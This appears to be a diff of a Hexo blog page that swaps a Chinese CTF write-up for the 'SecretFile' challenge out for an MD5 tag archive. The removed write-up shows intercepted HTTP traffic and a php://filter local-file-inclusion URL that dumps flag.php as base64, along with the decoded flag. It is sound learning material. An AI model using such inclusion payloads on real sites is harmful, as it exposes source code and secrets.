@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>2019[极客大挑战]SecretFile | 66+144</title>
+    <title>Tags: MD5 | 66+144</title>
     <meta name="author" content="LUEFLAM" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -31,10 +31,6 @@
 
 
 <script src="/MIA/js/lib/preview.js"></script>
-
-
-
-
 
 
 
@@ -148,120 +144,176 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div class="article">
-    <div>
-        <h1>2019[极客大挑战]SecretFile</h1>
-    </div>
-    <div class="info">
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/10/16
-        </span>
+            <div id="archives">
+    
+    <div class="categories-tags">
         
-        <span class="category">
-            <a href="/MIA/categories/CTF-Hard/">
+        
+        
+        <span>
+            <a href="/MIA/tags/CTF/" style="background: #00bcd4">
                 <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                    <i class="fa-solid fa-tags fa-fw"></i>
                 </span>
-                CTF_Hard
+                CTF
             </a>
         </span>
         
         
-        <span class="tags">
-            <span class="icon">
-                <i class="fa-solid fa-tags fa-fw"></i>
-            </span>
-            
-            
-            <span class="tag">
-                
-                <a href="/MIA/tags/CTF/" style="color: #CD5C5C">CTF</a>
-            </span>
-            
-            <span class="tag">
-                
-                <a href="/MIA/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="color: #ffa2c4">代码审计</a>
-            </span>
-            
+        
+        <span>
+            <a href="/MIA/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="background: #CD5C5C">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                代码审计
+            </a>
         </span>
         
+        
+        
+        <span>
+            <a href="/MIA/tags/TOOLs/" style="background: #ff7d73">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                TOOLs
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/MIA/tags/HTTP/" style="background: #7B68EE">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                HTTP
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/MIA/tags/LEARN/" style="background: #ff7d73">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                LEARN
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/MIA/tags/File-Upload/" style="background: #00bcd4">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                File Upload
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/MIA/tags/HEXO/" style="background: #ffa2c4">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                HEXO
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/MIA/tags/RVC/" style="background: #ff7d73">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                RVC
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/MIA/tags/for-fun/" style="background: #00a596">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                for_fun
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/MIA/tags/Reading/" style="background: #7B68EE">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                Reading
+            </a>
+        </span>
+        
+        
+        
+        <span>
+            <a href="/MIA/tags/MD5/" style="background: linear-gradient(120deg, #9abbf7 0%, #ffbbf4 100%)">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                MD5
+            </a>
+        </span>
+        
+        
+        
+        
     </div>
     
-    <div class="content" v-pre>
-        <p>误入了一下代码审计。。。主要是我还做出来第一步了，所以有很大兴趣继续做下去。<br>用开发者工具可以很容易看到被调成黑色与背景融为一体的<code>you find me</code>(大概这样)，其实也可以直接看到<code>Archive_room.php</code>这个文件名。<br>进去以后点点secret然后没有什么收获。<br>再来一次页面代码就很无聊了，所以排除再次ctrl+shift+I。<br>抓包试试，</p>
-<span id="more"></span>
-
-<p><strong>Request</strong></p>
-<pre><code>GET /action.php HTTP/1.1
-Host: 3b51e313-5282-4581-a4c7-2d3152b688a3.node4.buuoj.cn:81
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: zh,zh-TW;q=0.8,zh-HK;q=0.6,en-US;q=0.4,en;q=0.2
-Accept-Encoding: gzip, deflate
-Connection: close
-Referer: http://3b51e313-5282-4581-a4c7-2d3152b688a3.node4.buuoj.cn:81/Archive_room.php
-Upgrade-Insecure-Requests: 1
-</code></pre>
-<p><strong>Response</strong></p>
-<pre><code>HTTP/1.1 302 Found
-Server: openresty
-Date: Wed, 13 Sep 2023 12:25:16 GMT
-Content-Type: text/html; charset=UTF-8
-Connection: close
-Location: end.php
-X-Powered-By: PHP/7.3.11
-Content-Length: 63
-
-&lt;!DOCTYPE html&gt;
-
-&lt;html&gt;
-&lt;!--
-   secr3t.php        
---&gt;
-&lt;/html&gt;
-</code></pre>
-<p>可以看到一个被注释了的php文件。进入该文件中，出现了一堆页面代码，不够有提示一个<code>flag.php</code>，所以我们又顺着进去看看，nothing。<br>然后翻翻wp，说是<u><strong>filter伪协议</strong></u>。<br>所以构造<code>https://xxx/ser3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code>，进去之后下面那一串堪比乱码的字符如此显眼，加之我们构造的URL里面有个非常明显的base64，解码一下就是含有flag的页面代码。</p>
-<pre><code class="txt">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7Y2Q0MmNhNjUtYmNjNy00YjJiLWI0ZGQtYzYxNGZjZTBjMDI3fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= 
-</code></pre>
-<p>base64解码之后：</p>
-<pre><code class="html">&lt;!DOCTYPE html&gt;
-
-&lt;html&gt;
-
-    &lt;head&gt;
-        &lt;meta charset=&quot;utf-8&quot;&gt;
-        &lt;title&gt;FLAG&lt;/title&gt;
-    &lt;/head&gt;
-
-    &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
-        
-        &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
-        
-        &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;
-            &lt;?php
-                echo &quot;我就在这里&quot;;
-                $flag = &#39;flag&#123;cd42ca65-bcc7-4b2b-b4dd-c614fce0c027&#125;&#39;;
-                $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;
-            ?&gt;
-        &lt;/p&gt;
-    &lt;/body&gt;
-
-&lt;/html&gt;
-</code></pre>
-<p>就是这样子的效果，据说这叫代码审计。</p>
-<hr>
-<p><a href=https://blog.csdn.net/gental_z/article/details/122303393>filter伪协议</a><br><a href=https://www.cnblogs.com/linuxsec/articles/12684259.html>一些filter伪协议技巧</a></p>
-
+    <div class="timeline">
+        <div class="timeline-tail"></div>
+        <div class="timeline-content">
+            <div class="item-time">2023/10/29</div>
+            <a href="/MIA/2023/10/29/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy-web/">
+                <h3>安洵杯2019-easy-web</h3>
+            </a>
+            <div class="info">
+                
+                <span class="category">
+                    <a href="/MIA/categories/CTF-Middle/">
+                        <span class="icon">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </span>
+                        CTF_Middle
+                    </a>
+                </span>
+                
+                
+                <span class="tags">
+                    <span class="icon">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </span>
+                    
+                    
+                    <span class="tag">
+                        
+                        <a href="/MIA/tags/CTF/" style="color: #00bcd4">CTF</a>
+                    </span>
+                    
+                    <span class="tag">
+                        
+                        <a href="/MIA/tags/MD5/" style="color: #CD5C5C">MD5</a>
+                    </span>
+                    
+                </span>
+                
+            </div>
+        </div>
     </div>
-    
-    
-    
-    
-    
-    
     
 </div>
 
@@ -293,12 +345,6 @@ Content-Length: 63
         
     </div>
     <script src="/MIA/js/main.js"></script>
-    
-    
-
-
-
-
     
 </body>
 </html>
